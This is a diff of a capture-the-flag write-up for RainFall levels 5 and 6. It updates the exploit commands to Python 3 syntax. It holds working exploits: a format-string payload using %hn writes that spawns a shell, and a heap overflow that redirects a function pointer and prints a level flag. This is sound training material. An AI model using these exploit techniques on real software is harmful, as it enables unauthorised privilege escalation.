@@ -498,8 +498,8 @@ level5@RainFall:~$ objdump -R ./level5 | grep exit
 ```
 
 ```console
-$ python -c 'print "UUUU"+" %x"*10' | ./level5
-UUUU 200 b7fd1ac0 b7ff37d0 55555555 20782520 25207825 78252078 20782520 25207825 78252078
+$ python -c 'print("wwww" + " %x" * 10)' | ./level5
+wwww 200 b7fd1ac0 b7ff37d0 77777777 20782520 25207825 78252078 20782520 25207825 78252078
 ```
 
 o = 0x80484a4 = 134513828 = (2052, 33956)
@@ -514,7 +514,7 @@ Payload :
 - %5$hn : write 33956 to 5th argument (actually start of format string + 4)
 
 ```console
-level5@RainFall:~$ (python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044d%4$hn%31904d%5$hn"' ; cat -) | ./level5
+level5@RainFall:~$ (python -c 'print("\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044d%4$hn%31904d%5$hn")' ; cat -) | ./level5
 [...]
 $ whoami
 level6
@@ -529,13 +529,13 @@ Heap overflow
 ```console
 $ objdump -t level6 | grep n
 08048454 g     F .text  00000014              n
-$ ./level6 $(python -c 'print "U"*64+"\x54\x84\x04\x08"')
+$ ./level6 $(python -c 'print("*" * 64 + "\x54\x84\x04\x08")')
 Nope
-$ ./level6 $(python -c 'print "U"*68+"\x54\x84\x04\x08"')
+$ ./level6 $(python -c 'print("*" * 68 + "\x54\x84\x04\x08")')
 Segmentation fault (core dumped)
-$ ./level6 $(python -c 'print "U"*72+"\x54\x84\x04\x08"')
+$ ./level6 $(python -c 'print("*" * 72 + "\x54\x84\x04\x08")')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-$ ./level6 $(python -c 'print "U"*76+"\x54\x84\x04\x08"')
+$ ./level6 $(python -c 'print("*" * 76 + "\x54\x84\x04\x08")')
 Segmentation fault (core dumped)
 ```
 
